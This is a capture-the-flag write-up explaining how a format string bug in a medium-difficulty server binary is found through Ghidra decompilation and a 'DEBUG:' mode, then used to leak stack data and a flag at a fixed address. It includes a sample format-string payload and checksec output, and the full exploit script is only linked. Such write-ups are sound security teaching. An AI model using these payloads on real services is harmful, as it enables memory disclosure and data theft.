## Challenge Name: Pretty Printing
Categories: Exploitation
Difficulty: Medium

## Description: 

Get the binary [server](server) Exploit it! The vulnerable service is listening on port `9090`.

### Hint

If you get a string from the server, please add the `-` to form a valid `UUID`.

## Solution

If we run the program, we can see that it prints some data first ("Sorry, no flag in this binary"), which we can guess is the actual flag on the server. This string is stored as data in the binary, so our goal is to get it from the server binary.

If we decompile the source using Ghidra, we can see that the server listens on port 9090 and waits for socket connections. When it receives some data from one, it tries to enable a "DEBUG" mode and then compares the MD5 hash of what it received with a hardcoded hash:

```
memset(recv_buffer + compare_result,0,(long)(0x400 - compare_result));
set_debug(recv_buffer,recv_len & 0xffffffff);
dbg_print(__fd,socket_addr,idk,"received %d bytes\n",recv_len & 0xffffffff);
hashed = (char *)hash();
dbg_print(__fd,socket_addr,idk);
if (hashed != (char *)0x0) {
    dbg_print(__fd,socket_addr,idk,&DAT_004030a6,recv_buffer);
    compare_result = strcmp(hashed,"d8e8fca2dc0f896fd7cb4cb0031ba249");
...(prints some stuff)...

```

The hash comparison is impossible to bypass, so we focus on the debug mode. Checking the `set_debug` function, we can see that it checks if the string it got starts with "DEBUG:".

If we send that string to the binary, we get some additional information:

```
DEBUG:Test
received 11 bytes
Test
h(Test
)=2205e48de5f93c784733ffcca841d2b5
Wrong password, try again...
```

It first prints what we entered, so we can try the format string exploit:

```
DEBUG: %x %x %x %x
received 19 bytes
 1 5b5dac00 8000000 660cb8c1
h( %x %x %x %x
)=6252d1bd9d860e672620d6284b581344
Wrong password, try again...
```

And it works! We're able to read data from the stack, even though we aren't supposed to.
We can build on top of this to read a string from the exact address we want (address of the I talked about above). We find that address in Ghidra and it's `0x00405000`.

This address is static only because PIE is disabled on this executable:

```
>>> from pwntools import *
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ModuleNotFoundError: No module named 'pwntools'
>>> from pwn import *
>>> ELF('server')
[*] '/mnt/f/Projekti/ctf/ecsc/pretty/server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

More on this [here](https://www.redhat.com/en/blog/position-independent-executables-pie)


The script that builds the exploit can be found [here](solution.py).


If we run that exploit against the server, it returns bits of the flag. Putting it together, we get the solution.

---
[Back to home](../README.md)
